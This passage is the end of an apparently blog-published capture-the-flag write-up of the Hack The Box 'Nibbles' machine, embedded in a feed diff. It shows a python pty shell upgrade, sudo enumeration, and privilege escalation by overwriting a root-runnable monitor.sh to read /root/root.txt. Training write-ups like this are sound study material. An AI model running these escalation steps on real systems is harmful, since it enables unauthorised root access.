+/usr/bin/perl
+$ which python3
+/usr/bin/python3
+$ python3 -c &quot;import pty; pty.spawn('/bin/bash');&quot;  
+nibbler@Nibbles:/$ ls /home/nibbler
+ls /home/nibbler
+personal  personal.zip  user.txt
+nibbler@Nibbles:/$
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Since i am a Python guy, that’s a quite an easy choice.
+Now that we have the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user.txt&lt;/code&gt; flag, lets get root!
+One easy command to run is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo -l&lt;/code&gt;, which will report if the current user is in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/sudoers&lt;/code&gt; file, as well list what commands the current user is allowed to run.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nibbler@Nibbles:/$ sudo -l
+sudo -l
+sudo: unable to resolve host Nibbles: Connection timed out
+Matching Defaults entries for nibbler on Nibbles:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User nibbler may run the following commands on Nibbles:
+    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
+nibbler@Nibbles:/$
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Easy enough, at a quick glance in enumeration we can see that user nibbler is allowed to run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home/nibbler/personal/stuff/monitor.sh&lt;/code&gt; as root without a password!
+At this point getting the root flag should be fairly simple!&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nibbler@Nibbles:/home/nibbler/personal/stuff$ echo &quot;/bin/cat /root/root.txt&quot; &amp;gt; monitor.sh
+nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo /home/nibbler/personal/stuff/monitor.sh
+sudo: unable to resolve host Nibbles: Connection timed out
+b6d745[...snip...]8ef88c
+nibbler@Nibbles:/home/nibbler/personal/stuff$
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Done.&lt;/p&gt;
+
+&lt;div class=&quot;footnotes&quot; role=&quot;doc-endnotes&quot;&gt;
+  &lt;ol&gt;
+    &lt;li id=&quot;fn:1&quot; role=&quot;doc-endnote&quot;&gt;
+      &lt;p&gt;&lt;a href=&quot;www.hackthebox.eu&quot;&gt; www.hackthebox.eu&lt;/a&gt; &lt;a href=&quot;#fnref:1&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+    &lt;/li&gt;
+    &lt;li id=&quot;fn:2&quot; role=&quot;doc-endnote&quot;&gt;
+      &lt;p&gt;https://tools.kali.org/password-attacks/hydra &lt;a href=&quot;#fnref:2&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+    &lt;/li&gt;
+    &lt;li id=&quot;fn:3&quot; role=&quot;doc-endnote&quot;&gt;
+      &lt;p&gt;https://curesec.com/blog/article/blog/NibbleBlog-403-Code-Execution-47.html &lt;a href=&quot;#fnref:3&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+    &lt;/li&gt;
+  &lt;/ol&gt;
+&lt;/div&gt;</content>
+
+      
+      
+      
+      
+      
+
+      <author>
+          <name>Christoffer Claesson</name>
+        
+        
+      </author>
+
+      
+
+      
+        <category term="ctf" />
+      
+
+      
+        <summary type="html">“My writeup of the Hack the box Nibbles box… Nibble nibble!”</summary>
+      
+
+      
+      
+    </entry>
+  
+</feed>
